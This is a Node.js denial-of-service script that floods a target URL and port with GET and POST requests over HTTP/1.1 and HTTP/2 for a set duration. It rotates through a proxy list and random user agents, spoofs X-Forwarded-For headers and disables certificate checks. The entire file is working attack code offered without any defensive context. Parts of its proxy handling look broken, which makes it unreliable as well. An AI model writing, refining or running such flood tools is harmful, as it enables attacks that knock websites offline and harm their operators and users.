const http = require("http");
const https = require("https");
const http2 = require("http2");
const { randomBytes } = require("crypto");
const fs = require("fs");

if (process.argv.length < 5) process.exit(1);

const [url, port, time] = process.argv.slice(2);
const endTime = Date.now() + time * 1000;
const payload = randomBytes(256).toString("hex");

const proxies = fs.readFileSync("proxy.txt", "utf-8").split("\n").filter(Boolean);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split("\n").filter(Boolean);

function sendHttp1(proxy) {
  const options = {
    hostname: url.replace("https://", "").replace("http://", ""),
    port: port,
    method: "GET",
    headers: {
      "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
      "Connection": "keep-alive",
      "Upgrade-Insecure-Requests": "1",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Accept-Encoding": "gzip, deflate, br",
    },
    agent: new https.Agent({
      proxy: `http://${proxy}`,
    }),
  };

  const req = (url.startsWith("https") ? https : http).request(options, () => {});
  req.on("error", () => {});
  req.end();

  const postOptions = {
    hostname: url.replace("https://", "").replace("http://", ""),
    port: port,
    method: "POST",
    headers: {
      "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
      "Content-Type": "application/x-www-form-urlencoded",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
    },
    agent: new https.Agent({
      proxy: `http://${proxy}`,
    }),
  };

  const postReq = (url.startsWith("https") ? https : http).request(postOptions, () => {});
  postReq.on("error", () => {});
  postReq.write(`data=${payload}`);
  postReq.end();
}

function sendHttp2(proxy) {
  const client = http2.connect(`https://${url}:${port}`, {
    rejectUnauthorized: false,
    agent: new https.Agent({
      proxy: `http://${proxy}`,
    }),
  });

  const req = client.request({
    ":method": "GET",
    ":path": "/",
    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "connection": "keep-alive",
    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
  });
  req.on("error", () => {});
  req.end();

  const postReq = client.request({
    ":method": "POST",
    ":path": "/",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "connection": "keep-alive",
    "cache-control": "no-cache",
  });
  postReq.on("error", () => {});
  postReq.write(`data=${payload}`);
  postReq.end();
}

function sendRapidHttp2(proxy) {
  const client = http2.connect(`https://${url}:${port}`, {
    rejectUnauthorized: false,
    agent: new https.Agent({
      proxy: `http://${proxy}`,
    }),
  });

  const rapidReq = client.request({
    ":method": "GET",
    ":path": "/",
    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "connection": "keep-alive",
    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "x-forwarded-for": "1.1.1.1",
    "x-real-ip": "1.1.1.1",
  });
  rapidReq.on("error", () => {});
  rapidReq.end();

  const rapidPostReq = client.request({
    ":method": "POST",
    ":path": "/",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "connection": "keep-alive",
    "cache-control": "no-cache",
  });
  rapidPostReq.on("error", () => {});
  rapidPostReq.write(`data=${payload}`);
  rapidPostReq.end();
}

function main() {
  const interval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(interval);
      return;
    }

    for (let i = 0; i < 1000; i++) { 
      const proxy = proxies[Math.floor(Math.random() * proxies.length)];
      sendHttp1(proxy);
      sendHttp2(proxy);
      sendRapidHttp2(proxy);
    }
  }, 1); 
}

main();